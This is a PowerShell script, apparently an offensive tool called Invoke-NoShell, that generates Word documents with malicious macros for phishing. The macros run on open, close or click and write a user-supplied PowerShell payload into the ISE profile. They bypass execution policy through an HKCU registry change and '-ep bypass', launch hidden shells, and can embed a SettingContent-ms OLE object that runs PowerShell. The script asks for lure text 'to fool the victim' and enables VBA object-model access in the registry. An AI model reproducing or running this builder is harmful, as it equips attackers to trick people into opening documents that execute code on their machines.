<#

.SYNOPSIS
Creates a either a single custom doc with text, link and macro or multiple slightly different permutations of it.

.DESCRIPTION
Invoke-NoShell outputs a Mircosoft Office Word .doc file with an embedded macro.
It allows the automation of multiple similar versions of files, allowing to test how slight differences will effect it.
Currently, only Powershell payloads are supported.

Credit for Word COM object basics:
https://learn-powershell.net/2014/12/31/beginning-with-powershell-and-word/

.PARAMETER docPath
Full path for the output file.

.PARAMETER payloadPath 
Full path of a text file containing Powershell payload to embed

.PARAMETER docGenerationMod 
A or M - for auto or manual payload generation mode

.PARAMETER lureText 
Text to be displayed in the doc for the unsuspecting victim

.EXAMPLE 
Create all 12 possible permutations with the lure text "open sesame" armed with the Powershell script 
Invoke-NoShell.ps1 -M A -T "Open sesame" -P c:\MyPowershellz\payload.ps1

.EXAMPLE
Create a single document, manually select all the parameters
Invoke-NoShell.ps1 -M M

.EXAMPLE
Create all 12 possible permutations in the folder C:\MyDocsFolder
Invoke-NoShell.ps1 -D C:\MyDocsFolder -M A

.NOTES
You need to have Microsoft Office installed in order to run this script.
#>


# script params
param (
    [Parameter(Mandatory = $false)][alias("D")][string]$global:docPath = "$env:TEMP\NoShellMacroDoc.doc",
    [Parameter(Mandatory = $false)][alias("P")][string]$global:payloadPath,
    [Parameter(Mandatory = $false)][alias("M")][string]$docGenerationMod,
    [Parameter(Mandatory = $false)][alias("T")][string]$global:lureText, 
    [Parameter(Mandatory = $false)][alias("S")][string]$global:settingContentTempFilename = "$env:TEMP\content.SettingContent-ms"
)

# Enums and globals
Enum LaunchTechnique {
    onClick = 0
    onOpen = 1
    onClose = 2
    embed = 3
}

# looks a bit ugly here but prints out well due to escape chars
$NoShellBanner = @"

                       ``-:++++++++:-.``
                ``/oymMMMMMMMMMMMMMMMMmho/``
            ``-odMMMMMMMMMmmmmmmmNMMMMMMMMMms-``
          .omMMMMMMms+:````        ``.:oymMMMMMMNs.
        .yMMMMMNh/.   ..:://////::-.   .+dMMMMMMy-
      .yMMMMMm+``  .+oyyyyyyyyyyyyyyyyo/-  .oNMMMMMy.
     +NMMMMMMN+-+yyyyyyso+++yy++++oyyyyyyo:``oNMMMMMo
   ``yMMMMMMMMMMNdysooy+-----yy-----/ys+syyyy+.```hMMMMMy``
  ``hMMMMN:+NMMMMMNs--os-----oy-----oy:---+yyyy+``oNMMMMd``
  yMMMMN-````sydNMMMMMNs/y/----+o-----y+-----syyyys-/MMMMMh
 /MMMMM:.syyy+oNMMMMMNho----+o----+o-----os::syyy/oMMMMMo
1``mMMMMs``syyy:---sNMMMMMNs---+o----s:----so----syyy/mMMMMN``
/MMMMM.oyyys:----+dNMMMMMNs-+o---/o----o+-----oyyyyoMMMMM+
yMMMMd``yyys+so----:ssNMMMMMNyo---o----o/----/s+syyy+MMMMMh
yMMMMd:yyy+--/o/----o:oNMMMMMNs-:+---+/---:o+--/yyy+NMMMMh
yMMMMd:yyy/----/+:---+:-oNMMMMMNy:--+:---o+----/yyysmMMMMh
yMMMMd.yyys/-----/+---/:--sNMMMMMNs/---/+-----:oyyy+MMMMMh
:MMMMM.+syyyyo:----/:--:--:-oNMMMMMNs:/-----+syyyyssMMMMM/
 dMMMMs ``-+yyyys+:---:--------oNMMMMMNs--+syyyyo:````mMMMMm``
 :MMMMM:    .oyyyo--------------oNMMMMMNhyyyo:``   sMMMMM/
  oMMMMN-     oyyy----------------oNMMMMMMdy.    /MMMMMs
   sMMMMN:    +yyy+----------------:sNMMMMMMo``  oMMMMMy
    /MMMMMo   -yyyyyyyyyyyys++oyyyyyyydNMMMMMNohMMMMMo
     -mMMMMm/ ``yyyyyyyyyyyyyyyyyyyyyyyyydNMMMMMMMMMm-
       /mMMMMm/``           .::-``          sMMMMMMM+
        ``/mMMMMNy+``                    .ohMMMMMm+.
           :hNMMMMMdyo:..        ``-/ohmMMMMMNh/
             ``:smMMMMMMMMNNNdmNNNMMMMMMMMms/``
                 ``:oydNMMMMMMMMMMMMNdyo:.
"@

# helper for printing an error and terminating
Function PrintErrorAndTerminate($errMsg) {
    Write-Error $errMsg
    Exit
}

#####################################################################
# Helpers for setting the reg key enabling interaction with Word
#####################################################################

# Test if the registry value under key\name exists and equals to the designated value
Function Test-RegistryValue($regkey, $name, $value) {
    Try {
        Return ((Get-ItemProperty -Path $regkey -Name $name  -ErrorAction SilentlyContinue).$name -eq $value)
    }
    Catch {Return $false}
}

# Test if the registry value under key exists
Function Test-RegistryKey($regkey) {
    Try {
        Get-ItemProperty -Path $regkey -ErrorAction SilentlyContinue
        Return $true
    }
    Catch {Return $false}
}

# Checks if the mandatory registry value is set correctly
Function IsVbomSet() {
    If (Test-RegistryValue $path "AccessVBOM" 0x1) {return $true}
    Else {Return $false}
}

# Verify and set if required the mandatory VBOM registry value 
function VerifyVbomKey() {
    # Verify that the mandatory VBOM reg key is set
    $officeVer = (New-Object -ComObject word.application).version
    $path = "HKCU:\Software\Microsoft\Office\" + $officeVer.ToString() + "\Word\Security"
    If (Test-RegistryKey  $path) {
        If (-Not (IsVbomSet)) {
            # reg add and PowerShell have different approach to registry paths, removing colons
            $regCmdPath = $path.Replace("HKCU:\", "HKCU\")
            cmd.exe /c ("reg add " + $regCmdPath + " /f /v AccessVBOM /t REG_DWORD /d 0x1")

            # VBOM value verification
            If (IsVbomSet) {
                PrintErrorAndTerminate "VBOM registry value was set successfully!"    
            }
            Else {
                PrintErrorAndTerminate "Something went wrong while setting the VBOM registry value, terminating..."
            }
        }
        Else {
            Write-Output "VBOM registry value is already set, proceeding"
        }
    }
    Else {
        PrintErrorAndTerminate "Something went wrong while testing the existance of VBOM registry key, terminating..."
    }

}

#################################################
# Helpers for verifying payload won't break VBA
#################################################

# Verify that the line doesn't exceed the maximal allowed lenght of a VBA line
function VerifyLineLen($line) {
    if ($line.length -gt 1024) {
        PrintErrorAndTerminate @"
        One of the payload's lines is too long, VBA tolerates only lines shorter than 1024 chars.
        Faulty line is:
        $($line)
"@
    }
}

# Verify that no unsupported chars are in the payload
Function VerifyOnlyAscii($line) {
    # Check if when casted to UTF8 and ASCII string lenght is different
    $ascii = [System.Text.Encoding]::ASCII
    $utf8 = [System.Text.Encoding]::UTF8
    if ($ascii.GetBytes($line).length -eq $utf8.GetBytes($line).length) {
        return
    }
    else {
        PrintErrorAndTerminate @"
        One of the payload's lines contains non-ASCII char, VBA doesn't support this - consider encoding it in a differnet way.
        Faulty line is:
        $($line)
"@
    }
}

# Wrapper for all payload-VBA compatibility tests
Function VerifyVbaLine($line) {
    VerifyOnlyAscii($line)
    VerifyLineLen ($line)
}


#####################################################################
# A class which represents a single WinWord-macro-infused document
#####################################################################

Class MacroDoc {
    
    #########################################################
    # Fields
    #########################################################
    [Boolean] $isPowershellISE = $false
    [Boolean] $enablePowershell = $false
    [LaunchTechnique] $launchTechnique = 0
    [String] $clickText = "click me"
    [String] $clickTarget = "$env:PUBLIC\batch4ever.bat"
    [String] $payload = ""

    #########################################################
    # Static strings which are optional parts of the macro
    #########################################################
    $hkcuBypassRegKey = @"

    'allow execution even where PS is disabled
    stream.WriteLine "reg add ""HKEY_CURRENT_USER\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell"" /v ""ExecutionPolicy"" /t REG_SZ /d ""Unrestricted"" /f"

"@
    $iseSelfTerminateString = @"
    'finally, terminate the parent PowerShell ISE
    stream.WriteLine "Start-Sleep -s 1"
    stream.WriteLine "Stop-Process -processname PowerShell_ISE"
"@

    $batchLauncher = @"
    Dim strCommand As String
    Dim WshShell As Object
    Dim ret As Integer

    write_bat
    strCommand = "%PUBLIC%\Batch4ever.bat"
    Set WshShell = CreateObject("WScript.Shell")
    ret = WshShell.Run(strCommand, 0, True)
"@


    $batchWriter = @"
Dim strCommand As String
write_bat
"@

    
    #########################################################
    # OLE helper functions
    #########################################################

    CleanUp () {
        # "DTOR", at the moment remove temporary unnecessary file only when embedding OLE
        If ($this.launchTechnique -eq 3) {
            Remove-Item $global:settingContentTempFilename
        }
    }


    WriteSettingContentToDisk () {
        $rawPayload = [IO.File]::ReadAllText($global:payloadPath)
        $settingContentTemplate = @"
<?xml version="1.0" encoding="UTF-8"?>
<PCSettings>
    <SearchableContent xmlns="http://schemas.microsoft.com/Search/2013/SettingContent">
    <ApplicationInformation>
        <AppID>windows.immersivecontrolpanel_cw5n1h2txyewy!microsoft.windows.immersivecontrolpanel</AppID>
                <DeepLink>"%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe" -c 
                $($rawPayload)
            </DeepLink>
    </ApplicationInformation>
    <SettingIdentity>
        <PageID></PageID>
        <HostID>{12B1697E-D3A0-4DBC-B568-CCF64A3F934D}</HostID>
    </SettingIdentity>
    <SettingInformation>
        <Description>@shell32.dll,-4161</Description>
        <Keywords>@shell32.dll,-4161</Keywords>
    </SettingInformation>
    </SearchableContent>
</PCSettings>
"@
        [IO.File]::WriteAllLines($global:settingContentTempFilename, $settingContentTemplate)
    }

    
    #########################################################
    # Core member functuins
    #########################################################
    
    DerivDoc() {
        # create the first Word COM object
        Try {
            $word = New-Object -ComObject word.application
            $doc = $word.documents.add()

            if ($this.launchTechnique -eq 0) {
                # add link
                $range = $doc.Range()
                $doc.Hyperlinks.Add($range, $this.clickTarget, "" , "", $this.clickText)
            }

            # add text
            $selection = $word.selection
            $selection.typeText($global:lureText)
            $selection.typeParagraph()

            # saving the doc, last arg is reference to the enum type, doc
            Write-Host $global:docPath

            $doc.saveas([ref] $global:docPath, [ref] 0)
            $word.quit()

            $word = New-Object -ComObject Word.Application

            # add macro, for some odd reason I needed to open it after it is saved, otherwise it did not work
            $doc = $Word.Documents.Open($global:docPath)
            $doc.VBProject.VBComponents("ThisDocument").CodeModule.AddFromString($this.payload)

            # If we close the document and macro is set to run OnClose that's going to be a problem! So...
            If ($this.launchTechnique -eq 2) {
                0
                $doc.saveas([ref] $global:docPath, [ref] 0)
                # Forecefully stop WinWord
                Stop-Process -Name WINWORD
            }
            else {
                # Nothing will happen on close, we can be good boys and close it nicely
                $Doc.close()
                $Word.quit()
            }
        }
        Catch {
            Write-Host $PSItem.Exception.Message
        } 
    }

    # Derive the current class into an instance of a document with an OLE
    # We assume that launch technique == 3
    DerivOleDoc() {
        # create the first Word COM object
        Try {
            $word = New-Object -ComObject word.application
            $doc = $word.documents.add()

            # add text
            $selection = $word.selection
            
            # Embed the payload in the document's body
            $selection.InlineShapes.AddOLEObject("", $global:settingContentTempFilename)
            $selection.typeParagraph()
            $selection.typeText($global:lureText)
            $selection.typeParagraph()

            # saving the doc, last arg is reference to the enum type, doc
            Write-Host $global:docPath

            $doc.saveas([ref] $global:docPath, [ref] 0)
            $word.quit()

            $word = New-Object -ComObject Word.Application
        }
        Catch {
            Write-Host $PSItem.Exception.Message
        } 
    }

    # CTOR for creating the documents automatically
    MacroDoc(
        [Boolean] $isPowershellISE,
        [Boolean] $enablePowershell,
        [LaunchTechnique] $launchTechnique
    ) {

        # init with default values
        $epBypass = ""
        $placeholderForOptionalenablePowershell = ""
        $this.launchTechnique = $launchTechnique
        $macroFiresOn = "Open"
        $batchOrPowershellLauncher = ""
        $iseSelfTerminate = ""

        # Macro flow for launc techniques 0,1,2 and embedded payload flow for technique 3
        If (-Not ($this.launchTechnique -eq 3)) {
            # Select when to fire the payload
            If (($this.launchTechnique -eq 0) -or ($this.launchTechnique -eq 1)) {
                # OnOpen or OnClick since you need to prepare something to be behind the click
                $macroFiresOn = "Open"
            }
            ElseIf ($this.launchTechnique -eq 2) {
                # otherwise OnClose
                $macroFiresOn = "Close"
            }
            Else {
                PrintErrorAndTerminate "Illegal launcher selection, terminating..."
            }

            # Set the grounds for either Powershell or ISE hosts to bypass execution policy
            If ($enablePowershell) {
                # Use a neat trick to allow Powrshell execution via the HKCU registry
                $placeholderForOptionalenablePowershell = $this.hkcuBypassRegKey
                # simply add -ep bypass to the command executing the payload, if Powershell will be called directly
                $epBypass = "-ep bypass "
            }
            ElseIf (-Not ($enablePowershell)) {
                # Placeholders already set to be empty.
            }
            Else {
                PrintErrorAndTerminate "Illegal host selection, terminating..."
            }

            # Choose whether you want to launch Powershell directly which is less stealth, or do you wish to abuse PowershellISE
            If (-Not ($isPowershellISE)) {
                # Compose the beginning for the Powershell case
                # Cuurently only on open\close is implemented
                # TODO: add support to on click
                $batchOrPowershellLauncher = @"
Dim strCommand As String
Dim WshShell As Object
Dim ret As Integer

strCommand = "Powershell $($epBypass)-File ""%USERPROFILE%\Documents\WindowsPowerShell\Microsoft.PowerShellISE_profile.ps1"""
Set WshShell = CreateObject("WScript.Shell")
ret = WshShell.Run(strCommand, 0, True)
"@
            }

            ElseIf ($isPowershellISE) {
                # Compose the end for the PowershellISE case
                $iseSelfTerminate = $this.iseSelfTerminateString
                If (($this.launchTechnique -eq 1) -or ($this.launchTechnique -eq 2)) {
                    # ISE case, execute on Open\Close
                    $batchOrPowershellLauncher = $this.batchLauncher
                }
                Else {
                    # ISE case, execute on Click
                    $batchOrPowershellLauncher = $this.batchWriter
                }
            }
            Else {
                PrintErrorAndTerminate "Illegal host selection, terminating..."
            }

            # TODO: redundantly writes this function although not invoked on the case Powershell is selected as a host
            $writeBatFunc = @"
'write a batch file which PowerShell execution without administrator privileges.
'following that, it will be launching PowerShell ISE to run our payload
'in this version of the document the batch is executed on click
'alternative payload (automatically generated) will launch it on document close, for example
Function write_bat()
  Dim fso
  Set fso = CreateObject("Scripting.FileSystemObject")
  Dim stream
  Set stream = fso.OpenTextFile(Environ("public") & "\batch4ever.bat", 2, True)
  $($placeholderForOptionalenablePowershell)
  stream.WriteLine "Powershell_ISE"
End Function
"@

            $writePsFunc = @"
'writes the PowerShell script to the disk
'it will be loaded automatically when PowerShell ISE is started
Function write_ps()
  Dim fso
  Set fso = CreateObject("Scripting.FileSystemObject")
  Dim stream
    
  'verify the script folder exist, otherwise create it
  If fso.FolderExists(Environ("userprofile") & "\Documents\WindowsPowerShell") = False Then
    MkDir Environ("userprofile") & "\Documents\WindowsPowerShell"
  End If
  
  Set stream = fso.OpenTextFile(Environ("userprofile") & "\Documents\WindowsPowerShell\Microsoft.PowerShellISE_profile.ps1", 2, True)
  $($global:payloadInLines)
  
  $($iseSelfTerminate)

End Function
"@

            # This is the final macro, compose anything we've done so far here 
            $this.payload = @"
Option Explicit

'this will set our devious plan in motion
Private Sub Document_$($macroFiresOn)()
    write_ps
    $($batchOrPowershellLauncher)
End Sub

$($writePsFunc)

$($writeBatFunc)

"@
            $this.DerivDoc()
        
        }

        ElseIf ($this.launchTechnique -eq 3) {
            $this.WriteSettingContentToDisk()
            $this.DerivOleDoc()
        }

        Else {
            PrintErrorAndTerminate "Unknown launch technique selected, terminating..."
        }

        $this.CleanUp()
    }

    # Constructor for creating a single document manually
    MacroDoc() {
        # init with default values
        $usePowershellIse = $false
        $epBypass = $false
        [LaunchTechnique] $launch = 0

        # Select when to fire the payload
        while ($true) {
            $launch = Read-Host -Prompt @"
Please select when to launch the payload:
[0] - On click
[1] - On document open
[2] - On document close
[3] - Embed payload
"@
            If (($launch -eq 0) -or ($launch -eq 1)) {
                # OnOpen or OnClick since you need to prepare something to be behind the click
                If ($launch -eq 0) {
                    $this.clickText = Read-Host -Prompt "Please enter a label for the link"
                }
                break
            }
            ElseIf (($launch -eq 2) -or ($launch -eq 3)) {
                break
            }
            Else {
                Write-Error "Illegal selection, please retry"
            }
        }

        If ($launch -eq 3) {
            New-Object MacroDoc($usePowershellIse, $epBypass, $launch)
            Exit
        }

        # Set the grounds for either Powershell or ISE hosts to bypass execution policy
        while ($true) {
            $userInputEpBypass = Read-Host -Prompt "Would you like to force execution even if it is restricted?:`n[Y\N]"
            If ($userInputEpBypass -eq "Y") {
                $epBypass = $true
                break
            }
            ElseIf ($userInputEpBypass -eq "N") {
                $epBypass = $false
                break
            }
            Else {
                Write-Error "Illegal selection, please retry"
            }
        }

        # Choose whether you want to launch Powershell directly which is less stealth, or do you wish to abuse PowershellISE
        while ($true) {
            $psOrIse = Read-Host -Prompt "Please select a host for your Powershell payload:`n[0] - Powershell.exe`n[1] - PowershellISE.exe"

            If ($psOrIse -eq 0) {
                $usePowershellIse = $false
                break
            }

            ElseIf ($psOrIse -eq 1) {
                $usePowershellIse = $true
                break
            }

            Else {
                Write-Error "Illegal selection, please retry"
            }
        }
        New-Object MacroDoc($usePowershellIse, $epBypass, $launch) | Out-Null
    }
}


###################
# "main" function #
###################

# Declare how awesome you are
Write-Host $NoShellBanner

# Verify mandatory registry key is set
If ( -Not (VerifyVbomKey) ) {
    PrintErrorAndTerminate "Can't set VBOM registry value, terminating..."
}

# Get payload path if wasn't supplied as argument
While ($true) {
    Try {
        if (-Not ($global:payloadPath)) {
            $global:payloadPath = Read-Host -Prompt "Please insert a path with the payload you wish to embed"
        }
        # Parse and prepare the payload to be transplanted into the macro
        $global:payloadInLines = @"
stream.WriteLine "" `r`n
"@
        $payload = [IO.File]::ReadAllText($global:payloadPath)

        ForEach ($line in $($payload -split "`r`n")) {
            $line = $line.Replace("""", """""")
            $lineToWrite = "stream.WriteLine """ + $line + """`r`n"
            VerifyVbaLine $lineToWrite
            $global:payloadInLines = $global:payloadInLines + $lineToWrite
        }
        # If we are here - there were no errors and we can break the loop
        break
    }
    Catch {
        Write-Error "There's something wrong with the supplied path, please enter a new one"
        # erasing the bad value to allow the loop to restart correctly
        $global:payloadPath = ""
    }
}
if (-Not ($global:lureText)) {
    # If not supplied as arg - get the lure text
    $global:lureText = Read-Host -Prompt "Please enter text to fool the victim that this is a legit doc"
}
while ($true) {
    # If mode not supplied as an argument
    if (-Not ($docGenerationMod)) {
        $docGenerationMod = Read-Host -Prompt "Please select manual or auto mode:
[A] - Auto mode, will generate all possible permutations
[M] - Manual mode, carefully select options to apply on a single document"
    }
    If ($docGenerationMod -eq "A") {
        # Create output folder
        $OutDir = "$env:USERPROFILE\documents\MacroDocOutput"
        mkdir -Path $OutDir -ErrorAction SilentlyContinue

        $trueFalseArray = @($true, $false)
        $enumIndices = @(0, 1, 2)


        # Calling CTOR with dummy values for embedded payload
        # TODO: consider creating another CTOR or changing the overloading
        $global:docPath = $OutDir + "\MacroDoc3.doc"
        New-Object MacroDoc($false, $false, 3)


        foreach ($psOrISE in $trueFalseArray) {
            foreach ($doBypass in $trueFalseArray) {
                foreach ($fireMacroSelector in $enumIndices) {
                    # For each possible selection create a macro document and name it uniqly
                    $global:docPath = $OutDir + "\MacroDoc" + $psOrISE.ToString() + $doBypass.ToString() + $fireMacroSelector.ToString() + ".doc"
                    New-Object MacroDoc($psOrISE, $doBypass, $fireMacroSelector)
                }
            }
        }
        
        # Calling CTOR with dummy valse for embedded payload 
        # TODO: consider creating another CTOR or changing the overloading
        $global:docPath = $OutDir + "\MacroDoc3.doc"
        New-Object MacroDoc($false, $false, 3)
        
        break
    }
    ElseIf ($docGenerationMod -eq "M") {
        # manual mode, get user inputs
        New-Object MacroDoc
        break
    }
    Else {
        Write-Error "Illegal selection, please retry"
    }
}
